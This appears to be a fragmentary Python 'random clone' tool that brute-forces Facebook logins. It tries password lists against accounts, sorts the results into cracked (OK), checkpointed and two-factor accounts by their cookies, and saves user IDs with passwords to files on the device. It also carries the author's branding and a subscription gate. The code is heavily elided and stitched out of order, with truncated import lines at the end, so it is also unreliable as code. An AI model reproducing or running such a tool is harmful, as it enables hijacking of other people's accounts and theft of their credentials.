...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m TURAG AHAMED.            \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mTURAG Ahamed          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m TURAG 404       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m01863713434            \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                       \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m NOT KNOW        \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎FACEBOOK TRICKS AND HELPING ZONE [TURAG]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
\033[31;44m EVERYONE THINKS OF TURAG AHAMED CHANGING THE WORLD     
 BUT NO ONE THINKS OF TURAG AHAMED CHANGING HIMSELF.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def my_tool_security():
    ...
    print("\t  Fb page  : TURAG AHAMED")
    print("\t  Github   : TURAG404")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To TURAG AHAMED Tool ....")
        time.sleep(2)
    ...
    if f_token in my_server:
        ...
        print("\n\t     [ Hello User ]\n")
        print(" This is FREE tool you need NO subscription to use")
        print(" for buy subscription press enter an msg")
        print(" to RSA Programmer fb page and your key")
        print(" otherwise msg on this whatsapp 01863713434 \n")
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO TURAG AHAMED_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/turag.ahmed.18");xyz()
    elif hamii in ["4","04"]:
        os.system("xdg-open https://wa.me/+01863713434")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio TURAG_OK.mp3")
                print('\r\033[1;32m[TURAG-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio TURAG_2F.mp3")
                    print('\r\033[1;34m[TURAG-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/TURAG-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio TURAG_CP.mp3")
                    print(f'\r\033[1;30m[TURAG-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TURAG AHAMED 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
if __name__ == '__main__':
    xyz()
om bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
